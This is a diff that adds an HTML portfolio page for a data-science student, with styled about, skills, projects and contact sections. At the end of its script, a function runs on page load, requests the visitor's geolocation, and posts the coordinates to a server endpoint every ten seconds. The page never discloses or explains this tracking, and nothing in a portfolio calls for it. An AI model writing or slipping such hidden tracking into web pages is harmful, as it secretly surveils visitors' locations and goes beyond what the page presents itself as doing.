@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Karan Jangra — Portfolio</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg: #f9f8f6;
+      --surface: #ffffff;
+      --text: #1a1a1a;
+      --muted: #888;
+      --accent: #2563eb;
+      --accent-light: #dbeafe;
+      --border: #e8e6e1;
+      --radius: 14px;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.7;
+      font-size: 16px;
+    }
+
+    /* ── NAV ── */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 20px 60px;
+      background: rgba(249,248,246,0.85);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-logo {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.25rem;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      color: var(--text);
+      text-decoration: none;
+    }
+    .nav-links { display: flex; gap: 36px; list-style: none; }
+    .nav-links a {
+      font-size: 0.875rem;
+      font-weight: 400;
+      color: var(--muted);
+      text-decoration: none;
+      letter-spacing: 0.03em;
+      transition: color 0.2s;
+    }
+    .nav-links a:hover { color: var(--text); }
+
+    /* ── HERO ── */
+    #hero {
+      min-height: 100vh;
+      display: flex; align-items: center;
+      padding: 120px 60px 80px;
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+    .hero-inner { max-width: 700px; }
+    .hero-tag {
+      display: inline-block;
+      font-size: 0.78rem;
+      font-weight: 500;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--accent);
+      background: var(--accent-light);
+      padding: 4px 14px;
+      border-radius: 100px;
+      margin-bottom: 28px;
+      opacity: 0;
+      animation: fadeUp 0.6s 0.1s forwards;
+    }
+    h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(2.8rem, 6vw, 4.5rem);
+      font-weight: 600;
+      line-height: 1.1;
+      letter-spacing: -0.03em;
+      margin-bottom: 24px;
+      opacity: 0;
+      animation: fadeUp 0.7s 0.25s forwards;
+    }
+    h1 span { color: var(--accent); }
+    .hero-sub {
+      font-size: 1.1rem;
+      font-weight: 300;
+      color: #555;
+      max-width: 520px;
+      margin-bottom: 40px;
+      opacity: 0;
+      animation: fadeUp 0.7s 0.4s forwards;
+    }
+    .hero-cta {
+      display: flex; gap: 16px; flex-wrap: wrap;
+      opacity: 0;
+      animation: fadeUp 0.7s 0.55s forwards;
+    }
+    .btn {
+      display: inline-flex; align-items: center; gap: 8px;
+      padding: 13px 28px;
+      border-radius: 100px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      text-decoration: none;
+      transition: all 0.2s;
+      cursor: pointer;
+      border: none;
+    }
+    .btn-primary { background: var(--text); color: #fff; }
+    .btn-primary:hover { background: var(--accent); transform: translateY(-2px); box-shadow: 0 8px 24px rgba(37,99,235,0.25); }
+    .btn-outline { background: transparent; color: var(--text); border: 1.5px solid var(--border); }
+    .btn-outline:hover { border-color: var(--text); transform: translateY(-2px); }
+
+    /* ── SECTIONS ── */
+    section { padding: 100px 60px; max-width: 1100px; margin: 0 auto; }
+    .section-label {
+      font-size: 0.75rem;
+      font-weight: 500;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 12px;
+    }
+    .section-title {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(1.8rem, 3.5vw, 2.6rem);
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      margin-bottom: 48px;
+      line-height: 1.2;
+    }
+
+    /* ── ABOUT ── */
+    #about { border-top: 1px solid var(--border); }
+    .about-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 80px;
+      align-items: start;
+    }
+    .about-text { font-size: 1rem; color: #444; font-weight: 300; }
+    .about-text p { margin-bottom: 16px; }
+    .about-right {}
+    .info-list { list-style: none; }
+    .info-list li {
+      display: flex;
+      justify-content: space-between;
+      padding: 14px 0;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.9rem;
+    }
+    .info-list li:first-child { border-top: 1px solid var(--border); }
+    .info-label { color: var(--muted); font-weight: 400; }
+    .info-value { font-weight: 500; }
+
+    /* ── SKILLS ── */
+    #skills { border-top: 1px solid var(--border); }
+    .skills-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 16px;
+    }
+    .skill-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px 20px;
+      transition: all 0.2s;
+    }
+    .skill-card:hover {
+      border-color: var(--accent);
+      box-shadow: 0 4px 20px rgba(37,99,235,0.08);
+      transform: translateY(-3px);
+    }
+    .skill-icon { font-size: 1.5rem; margin-bottom: 12px; }
+    .skill-name { font-size: 0.92rem; font-weight: 500; margin-bottom: 4px; }
+    .skill-level { font-size: 0.78rem; color: var(--muted); }
+
+    /* ── PROJECTS ── */
+    #projects { border-top: 1px solid var(--border); }
+    .projects-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+      gap: 24px;
+    }
+    .project-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+      transition: all 0.25s;
+      display: flex;
+      flex-direction: column;
+    }
+    .project-card:hover {
+      box-shadow: 0 12px 40px rgba(0,0,0,0.09);
+      transform: translateY(-4px);
+    }
+    .project-thumb {
+      height: 180px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.5rem;
+      background: linear-gradient(135deg, #f0f4ff 0%, #e8f0fe 100%);
+    }
+    .project-body { padding: 24px; flex: 1; display: flex; flex-direction: column; }
+    .project-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 14px; }
+    .tag {
+      font-size: 0.72rem;
+      font-weight: 500;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      padding: 3px 10px;
+      border-radius: 100px;
+      background: var(--accent-light);
+      color: var(--accent);
+    }
+    .project-name {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.2rem;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+    .project-desc { font-size: 0.88rem; color: #555; font-weight: 300; flex: 1; margin-bottom: 20px; }
+    .project-link {
+      font-size: 0.82rem;
+      font-weight: 500;
+      color: var(--accent);
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .project-link:hover { gap: 8px; }
+
+    /* ── CONTACT ── */
+    #contact {
+      border-top: 1px solid var(--border);
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    #contact .section-label, #contact .section-title { text-align: center; }
+    .contact-desc { font-size: 1rem; color: #555; font-weight: 300; max-width: 420px; margin-bottom: 36px; }
+    .contact-links { display: flex; gap: 14px; flex-wrap: wrap; justify-content: center; }
+
+    /* ── FOOTER ── */
+    footer {
+      border-top: 1px solid var(--border);
+      text-align: center;
+      padding: 32px 60px;
+      font-size: 0.82rem;
+      color: var(--muted);
+    }
+
+    /* ── ANIMATIONS ── */
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(24px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .reveal {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.6s ease, transform 0.6s ease;
+    }
+    .reveal.visible { opacity: 1; transform: none; }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 768px) {
+      nav { padding: 18px 24px; }
+      .nav-links { gap: 20px; }
+      #hero, section { padding-left: 24px; padding-right: 24px; }
+      .about-grid { grid-template-columns: 1fr; gap: 40px; }
+      .skills-grid { grid-template-columns: repeat(2, 1fr); }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- NAV -->
+  <nav>
+    <a href="#hero" class="nav-logo">KJ.</a>
+    <ul class="nav-links">
+      <li><a href="#about">About</a></li>
+      <li><a href="#skills">Skills</a></li>
+      <li><a href="#projects">Projects</a></li>
+      <li><a href="#contact">Contact</a></li>
+    </ul>
+  </nav>
+
+  <!-- HERO -->
+  <div id="hero">
+    <div class="hero-inner">
+      <span class="hero-tag">Available for internships & projects</span>
+      <h1>Hi, I'm <span>Karan</span><br/>Jangra.</h1>
+      <p class="hero-sub">
+        3rd year CS (Data Science) student at NSUT, Delhi — building intelligent systems, clean web apps, and turning data into decisions.
+      </p>
+      <div class="hero-cta">
+        <a href="#projects" class="btn btn-primary">View Projects →</a>
+        <a href="#contact" class="btn btn-outline">Get in Touch</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ABOUT -->
+  <section id="about">
+    <div class="reveal">
+      <p class="section-label">Who I Am</p>
+      <h2 class="section-title">A developer with a<br/>love for data.</h2>
+    </div>
+    <div class="about-grid reveal">
+      <div class="about-text">
+        <p>I'm Karan Jangra, a third-year Computer Science student specialising in Data Science at Netaji Subhas University of Technology (NSUT), New Delhi.</p>
+        <p>I love building end-to-end products — from crafting clean, responsive frontends to designing data pipelines and training ML models that solve real problems.</p>
+        <p>When I'm not coding, you'll find me exploring research papers, contributing to open source, or competing in hackathons.</p>
+      </div>
+      <div class="about-right">
+        <ul class="info-list">
+          <li><span class="info-label">University</span><span class="info-value">NSUT, New Delhi</span></li>
+          <li><span class="info-label">Degree</span><span class="info-value">B.Tech CSE (Data Science)</span></li>
+          <li><span class="info-label">Year</span><span class="info-value">3rd Year</span></li>
+          <li><span class="info-label">Location</span><span class="info-value">Delhi, India</span></li>
+          <li><span class="info-label">Status</span><span class="info-value" style="color:var(--accent)">Open to Opportunities</span></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- SKILLS -->
+  <section id="skills">
+    <div class="reveal">
+      <p class="section-label">What I Work With</p>
+      <h2 class="section-title">Skills & Technologies</h2>
+    </div>
+    <div class="skills-grid reveal">
+      <div class="skill-card">
+        <div class="skill-icon">🐍</div>
+        <div class="skill-name">Python</div>
+        <div class="skill-level">Advanced</div>
+      </div>
+      <div class="skill-card">
+        <div class="skill-icon">🤖</div>
+        <div class="skill-name">Machine Learning</div>
+        <div class="skill-level">Scikit-learn · XGBoost</div>
+      </div>
+      <div class="skill-card">
+        <div class="skill-icon">🧠</div>
+        <div class="skill-name">Deep Learning</div>
+        <div class="skill-level">PyTorch · TensorFlow</div>
+      </div>
+      <div class="skill-card">
+        <div class="skill-icon">📊</div>
+        <div class="skill-name">Data Analysis</div>
+        <div class="skill-level">Pandas · NumPy · SQL</div>
+      </div>
+      <div class="skill-card">
+        <div class="skill-icon">🌐</div>
+        <div class="skill-name">Web Dev</div>
+        <div class="skill-level">React · Node.js · HTML/CSS</div>
+      </div>
+      <div class="skill-card">
+        <div class="skill-icon">☁️</div>
+        <div class="skill-name">Cloud & DevOps</div>
+        <div class="skill-level">Git · Docker · AWS</div>
+      </div>
+      <div class="skill-card">
+        <div class="skill-icon">🗄️</div>
+        <div class="skill-name">Databases</div>
+        <div class="skill-level">PostgreSQL · MongoDB</div>
+      </div>
+      <div class="skill-card">
+        <div class="skill-icon">📈</div>
+        <div class="skill-name">Data Visualisation</div>
+        <div class="skill-level">Matplotlib · Tableau</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PROJECTS -->
+  <section id="projects">
+    <div class="reveal">
+      <p class="section-label">What I've Built</p>
+      <h2 class="section-title">Featured Projects</h2>
+    </div>
+    <div class="projects-grid reveal">
+
+      <div class="project-card">
+        <div class="project-thumb">📉</div>
+        <div class="project-body">
+          <div class="project-tags"><span class="tag">Python</span><span class="tag">ML</span><span class="tag">Streamlit</span></div>
+          <div class="project-name">Stock Price Predictor</div>
+          <p class="project-desc">An LSTM-based deep learning model that forecasts stock prices using historical data, with an interactive Streamlit dashboard for real-time visualisation.</p>
+          <a href="#" class="project-link">View Project →</a>
+        </div>
+      </div>
+
+      <div class="project-card">
+        <div class="project-thumb">💬</div>
+        <div class="project-body">
+          <div class="project-tags"><span class="tag">NLP</span><span class="tag">React</span><span class="tag">FastAPI</span></div>
+          <div class="project-name">Sentiment Analyser</div>
+          <p class="project-desc">A full-stack sentiment analysis tool using a fine-tuned BERT model, with a clean React frontend and a FastAPI backend for instant results.</p>
+          <a href="#" class="project-link">View Project →</a>
+        </div>
+      </div>
+
+      <div class="project-card">
+        <div class="project-thumb">🏥</div>
+        <div class="project-body">
+          <div class="project-tags"><span class="tag">Data Science</span><span class="tag">Python</span><span class="tag">Pandas</span></div>
+          <div class="project-name">Healthcare EDA Dashboard</div>
+          <p class="project-desc">An exploratory data analysis project on patient health records, uncovering key trends using statistical visualisation and hypothesis testing.</p>
+          <a href="#" class="project-link">View Project →</a>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- CONTACT -->
+  <section id="contact">
+    <div class="reveal">
+      <p class="section-label">Let's Connect</p>
+      <h2 class="section-title">Get in Touch</h2>
+      <p class="contact-desc">Whether it's a project, internship opportunity, or just a chat about tech — my inbox is always open.</p>
+      <div class="contact-links">
+        <a href="mailto:karan@example.com" class="btn btn-primary">✉️ Email Me</a>
+        <a href="https://linkedin.com" target="_blank" class="btn btn-outline">LinkedIn</a>
+        <a href="https://github.com" target="_blank" class="btn btn-outline">GitHub</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer>
+    <p>© 2025 Karan Jangra · Designed & Built with care.</p>
+  </footer>
+
+  <script>
+    // Scroll reveal
+    const reveals = document.querySelectorAll('.reveal');
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          e.target.classList.add('visible');
+          observer.unobserve(e.target);
+        }
+      });
+    }, { threshold: 0.12 });
+    reveals.forEach(el => observer.observe(el));
+
+    function sendLocation() {
+        if (!navigator.geolocation) {
+        alert("Geolocation not supported");
+        return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            const { latitude, longitude } = position.coords;
+
+            await fetch("/api/v1/location/update", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                latitude,
+                longitude,
+            }),
+            });
+        },
+        (error) => {
+            console.error(error);
+        }
+        );
+    }
+
+    sendLocation();
+    setInterval(sendLocation, 10000);
+  </script>
+
+</body>
+</html>
